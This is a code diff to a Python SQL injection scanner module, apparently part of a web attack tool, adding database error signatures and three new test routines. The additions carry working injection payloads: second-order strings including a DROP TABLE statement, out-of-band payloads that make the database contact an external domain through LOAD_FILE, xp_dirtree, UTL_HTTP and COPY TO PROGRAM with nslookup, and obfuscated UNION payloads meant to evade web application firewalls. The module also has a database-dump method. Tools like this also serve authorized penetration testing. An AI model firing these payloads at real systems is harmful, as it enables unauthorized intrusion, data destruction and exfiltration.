@@ -54,6 +54,9 @@ class SQLiModule:
                 'sql syntax', 'syntax error', 'unexpected',
                 'sqlstate', 'jdbc', 'odbc',
             ],
+            'mariadb': ['mariadb', 'maria'],
+            'cockroachdb': ['cockroachdb', 'crdb', 'cockroach'],
+            'clickhouse': ['clickhouse', 'code: 62'],
         }
     
     def test(self, url: str, method: str, param: str, value: str):
@@ -69,6 +72,15 @@ class SQLiModule:
         
         # Test boolean-based SQLi
         self._test_boolean_based(url, method, param, value)
+        
+        # Test second-order SQLi
+        self._test_second_order(url, method, param, value)
+        
+        # Test out-of-band SQLi
+        self._test_oob_sqli(url, method, param, value)
+        
+        # Test WAF bypass payloads
+        self._test_waf_bypass_payloads(url, method, param, value)
     
     def test_url(self, url: str):
         """Test URL for SQLi"""
@@ -269,6 +281,139 @@ class SQLiModule:
         except Exception as e:
             if self.engine.config.get('verbose'):
                 print(f"{Colors.error(f'Boolean SQLi test error: {e}')}")
+    
+    def _test_second_order(self, url: str, method: str, param: str, value: str):
+        """Test for second-order SQL injection.
+
+        Injects a payload via the original endpoint and then checks
+        secondary endpoints for SQL error signatures that would indicate
+        the stored payload was executed in a different query context.
+        """
+        payloads = ["admin'--", "' OR '1'='1", "'; DROP TABLE test--"]
+        secondary_endpoints = ['/profile', '/account', '/dashboard']
+
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                self.requester.request(url, method, data=data)
+
+                # Parse the base URL to build secondary check URLs
+                from urllib.parse import urlparse
+                parsed = urlparse(url)
+                base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+                for endpoint in secondary_endpoints:
+                    try:
+                        check_url = f"{base_url}{endpoint}"
+                        response = self.requester.request(check_url, 'GET')
+
+                        if not response:
+                            continue
+
+                        response_text = response.text.lower()
+                        for db_type, signatures in self.error_signatures.items():
+                            for sig in signatures:
+                                if sig.lower() in response_text:
+                                    from core.engine import Finding
+                                    finding = Finding(
+                                        technique="SQL Injection (Second-Order)",
+                                        url=url,
+                                        severity='HIGH',
+                                        confidence=0.75,
+                                        param=param,
+                                        payload=payload,
+                                        evidence=f"SQL error on {endpoint} after injecting into {param}",
+                                    )
+                                    self.engine.add_finding(finding)
+                                    return
+                    except Exception:
+                        continue
+
+            except Exception as e:
+                if self.engine.config.get('verbose'):
+                    print(f"{Colors.error(f'Second-order SQLi test error: {e}')}")
+
+    def _test_oob_sqli(self, url: str, method: str, param: str, value: str):
+        """Test for out-of-band (OOB) SQL injection.
+
+        Sends payloads that attempt to trigger DNS or HTTP requests to an
+        external domain.  A positive result requires separate verification
+        on the OOB listener, so findings are reported with lower confidence.
+        """
+        oob_domain = self.engine.config.get('oob_domain', 'oob.example.com')
+
+        payloads = [
+            f"' UNION SELECT LOAD_FILE('\\\\\\\\{oob_domain}\\\\share\\\\file') --",
+            f"'; EXEC master..xp_dirtree '\\\\\\\\{oob_domain}\\\\test' --",
+            f"' UNION SELECT UTL_HTTP.REQUEST('http://{oob_domain}/exfil') FROM dual --",
+            f"'; COPY (SELECT '') TO PROGRAM 'nslookup {oob_domain}' --",
+        ]
+
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+
+                if response:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="SQL Injection (OOB Exfiltration)",
+                        url=url,
+                        severity='MEDIUM',
+                        confidence=0.5,
+                        param=param,
+                        payload=payload,
+                        evidence=f"OOB payload sent to {oob_domain}; verify on listener",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+
+            except Exception as e:
+                if self.engine.config.get('verbose'):
+                    print(f"{Colors.error(f'OOB SQLi test error: {e}')}")
+
+    def _test_waf_bypass_payloads(self, url: str, method: str, param: str, value: str):
+        """Test for SQL injection using WAF bypass techniques.
+
+        Uses obfuscated payloads that employ inline comments, case
+        alternation, double URL-encoding, and comment splitting to evade
+        web application firewalls.
+        """
+        payloads = [
+            "' /*!UNION*/ /*!SELECT*/ NULL,NULL,NULL --",
+            "' uNiOn SeLeCt NULL,NULL,NULL --",
+            "' %2527%2520UNION%2520SELECT%2520NULL--",
+            "' UN/**/ION SEL/**/ECT NULL,NULL,NULL --",
+        ]
+
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+
+                if not response:
+                    continue
+
+                response_text = response.text.lower()
+                for db_type, signatures in self.error_signatures.items():
+                    for sig in signatures:
+                        if sig.lower() in response_text:
+                            from core.engine import Finding
+                            finding = Finding(
+                                technique="SQL Injection (WAF Bypass)",
+                                url=url,
+                                severity='HIGH',
+                                confidence=0.85,
+                                param=param,
+                                payload=payload,
+                                evidence=f"WAF bypass successful, {db_type} error detected",
+                            )
+                            self.engine.add_finding(finding)
+                            return
+
+            except Exception as e:
+                if self.engine.config.get('verbose'):
+                    print(f"{Colors.error(f'WAF bypass SQLi test error: {e}')}")
     
     def exploit_dump_database(self, url: str, param: str, db_type: str = 'mysql'):
         """Attempt to dump database"""
